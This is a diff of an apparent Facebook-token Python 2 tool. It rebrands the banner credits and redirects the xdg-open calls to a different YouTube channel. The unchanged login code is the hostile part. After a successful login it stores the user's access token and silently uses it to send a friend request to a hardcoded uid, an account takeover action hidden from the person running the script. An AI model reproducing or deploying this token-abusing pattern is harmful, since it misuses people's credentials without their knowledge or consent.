@@ -56,8 +56,8 @@ logo = """ -----------------------------•◈•
 \033[1;96m╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░
 \033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mJackroo-eng
-\033[1;96mInstagram \033[1;93m: \033[1;Nai
-\033[1;96mFacebook  \033[1;93m: \033[1; Jack vai
+\033[1;96mYoutube  \033[1;93m: \033[1;92mJackroo-eng
+\033[1;96mFacebook  \033[1;93m: \033[1;92mJack vai
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/jackroo-eng
 \033[1;91m======================================="""
 
@@ -80,8 +80,8 @@ os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mJackroo-eng
-\033[1;96mInstagram \033[1;93m: \033[1;92mNai
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Jack vai
+\033[1;96mYoutube  \033[1;93m: \033[1;92mJackroo-eng
+\033[1;96mFacebook  \033[1;93m: \033[1;92mJack vai
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/jackroo-eng
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
@@ -99,10 +99,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
 
 def login():
 	os.system('clear')
@@ -143,7 +143,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
